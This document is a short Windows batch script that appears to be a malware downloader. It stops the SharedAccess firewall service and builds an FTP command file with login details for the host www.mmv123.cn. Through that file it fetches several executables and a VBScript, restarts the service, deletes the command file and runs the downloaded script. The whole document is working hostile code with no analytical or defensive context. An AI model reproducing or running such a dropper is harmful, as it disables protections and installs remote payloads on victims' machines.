
sc stop sharedaccess
@echo open www.mmv123.cn 21>c5.dat
@echo 5565844>>c5.dat
@echo zhenhao888>>c5.dat
@echo cd wwwroot>>c5.dat
@echo binary>>c5.dat
@echo get small.exe>>c5.dat
@echo get 1027345.exe>>c5.dat
@echo get fei.exe>>c5.dat
@echo get zzp.exe>>c5.dat
@echo get 9009.exe>>c5.dat
@echo get msn036.exe>>c5.dat
@echo get 5.exe>>c5.dat
@echo get 3.vbs>>c5.dat
@echo bye>>c5.dat
ftp -s:c5.dat
sc start sharedaccess
del c5.dat
ping -n 3 127.1>nul
3.vbs
exit
